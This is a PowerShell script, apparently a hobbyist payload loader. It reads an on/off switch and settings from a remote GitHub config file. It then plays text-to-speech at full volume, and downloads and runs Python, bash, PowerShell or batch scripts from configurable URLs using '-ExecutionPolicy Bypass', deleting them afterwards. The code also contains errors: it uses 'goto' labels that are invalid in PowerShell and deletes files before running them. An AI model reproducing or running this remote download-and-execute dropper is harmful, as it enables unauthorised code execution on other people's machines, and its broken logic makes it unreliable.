# Default color
# Set Console Window Properties
# mode con: cols=80 lines=25

# Set the URL of the configuration file on GitHub
# There is an empty template at https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg
$configUrl = "https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg"
$configLocal = "Local-Config.cfg"

# Initialize availableRemoteConfig and activeStatus to expected values
$availableRemoteConfig = $null
$activeStatus = $null

# Fetch and process the configuration file
$configContent = Invoke-RestMethod -Uri $configUrl -ErrorAction SilentlyContinue
if ($?) {
    $availableRemoteConfig = $true
    $activeStatus = ($configContent -match "Active=true")
} else {
    $availableRemoteConfig = $false
}

# Process based on fetched configuration
if ($availableRemoteConfig) {
    if ($activeStatus) {
        $configFile = Invoke-RestMethod -Uri $configUrl
        goto Active
    } else {
        Write-Host "Remote file available with 'Active=false'."
        Read-Host -Prompt "Press Enter to continue..."
        exit
    }
} else {
    if (Test-Path $configLocal) {
        $localConfigContent = Get-Content -Path $configLocal
        if ($localConfigContent -match "Active=true") {
            $configFile = Get-Content -Path $configLocal
            goto Active
        } else {
            Write-Host "Local configuration file is not active. Exiting..."
        }
    } else {
        Write-Host "Local configuration file not found. Exiting..."
    }
    Read-Host -Prompt "Press Enter to continue..."
    exit
}

:Active
# Initialize variables
$texttospeechenabled = $null
$texttospeech = $null
$scriptinfrenabled = $null
$scriptinfrl = $null
$scriptinfrn = $null

# Get variables from config file
foreach ($line in $configFile) {
    $key, $value = $line -split '=', 2
    switch ($key.Trim().ToLower()) {
        "text_to_speech_enabled" {
            $texttospeechenabled = $value.Trim()
        }
        "text_to_speech" {
            $texttospeech = $value.Trim()
        }
        "script_infr_enabled" {
            $scriptinfrenabled = $value.Trim()
        }
        "script_infr_l" {
            $scriptinfrl = $value.Trim()
        }
        "script_infr_n" {
            $scriptinfrn = $value.Trim()
        }
        "inprovised_script_enabled" {
            $inprovisedscriptenabled = $value.Trim()
        }
        "inprovised_script_url" {
            $inprovisedscripturl = $value.Trim()
        }
        "inprovised_script_n" {
            $inprovisedscriptn = $value.Trim()
        }
        "inprovised_script_lenguage" {
            $inprovisedscriptlenguage = $value.Trim()
        }
    }
}

# Check if text to speech is enabled
if ($null -eq $texttospeechenabled) {
    $texttospeechenabled = $true
    Write-Host "Text to speech not defined. Defaulting to true."
}
# Check if text to speech is configured
if ($null -eq $texttospeech) {
    $texttospeech = "No text to speech configured."
    Write-Host "No text to speech configured."
}
# Check if script info retrieval is enabled
if ($null -eq $scriptinfrenabled) {
    $scriptinfrenabled = $true
    Write-Host "Info retrieve not defined. Defaulting to true."
}
# Check if script info retrieval link is set
if ($null -eq $scriptinfrl) {
    $scriptinfrl = "https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg"
    Write-Host "No link is set. Retrieving the default script."
}
# Check if script info retrieval name is set
if ($null -eq $scriptinfrn) {
    $scriptinfrn = "payload.ps1"
}


#======================== Payload ========================#
# Text to speech payload
if ($texttospeechenabled -eq "true") {
    $volumeLevel = 100
    $vbsScript = @"
    Set speech = CreateObject("SAPI.SpVoice")
    speech.Volume = $volumeLevel
    speech.Speak "$texttospeech"
"@
    $vbsScriptPath = [IO.Path]::Combine([IO.Path]::GetTempPath(), "texttospeech.vbs")
    $vbsScript | Out-File -FilePath $vbsScriptPath -Encoding ASCII
    Start-Process "cscript.exe" -ArgumentList "//nologo", $vbsScriptPath -Wait
    Remove-Item -Path $vbsScriptPath
}
# Info retrieve payload
if ($scriptinfrenabled -eq "true") {
    Invoke-RestMethod -Uri $scriptinfrl -OutFile $scriptinfrn
    powershell.exe -ExecutionPolicy Bypass -File $scriptinfrn
    Remove-Item -Path $scriptinfrn
}
# Inprovised script
if ($inprovisedscriptenabled -eq "true") {
    if ($inprovisedscriptlenguage -eq "python") {
        Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.py
        powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.py
        Remove-Item -Path $inprovisedscriptn.py
        & python.exe "$inprovisedscriptn.py"
    } elseif ($inprovisedscriptlenguage -eq "bash") {
        Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.sh
        powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.sh
        Remove-Item -Path $inprovisedscriptn.sh
        & bash.exe "$inprovisedscriptn.sh"
    } elseif ($inprovisedscriptlenguage -eq "powershell") {
        Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.ps1
        powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.ps1
        Remove-Item -Path $inprovisedscriptn.ps1
        & powershell.exe -ExecutionPolicy Bypass -File "$inprovisedscriptn.ps1" 
    } elseif ($inprovisedscriptlenguage -eq "batch") {
        Invoke-RestMethod -Uri $inprovisedscripturl -OutFile $inprovisedscriptn.bat
        powershell.exe -ExecutionPolicy Bypass -File $inprovisedscriptn.bat
        Remove-Item -Path $inprovisedscriptn.bat
        & "$inprovisedscriptn.bat"
    } else {
        Write-Host "Invalid language. Exiting..."
        Read-Host -Prompt "Press Enter to continue..."
        exit
    }
}

Write-Host "Script processed successfully."
Read-Host -Prompt "Press Enter to exit"
exit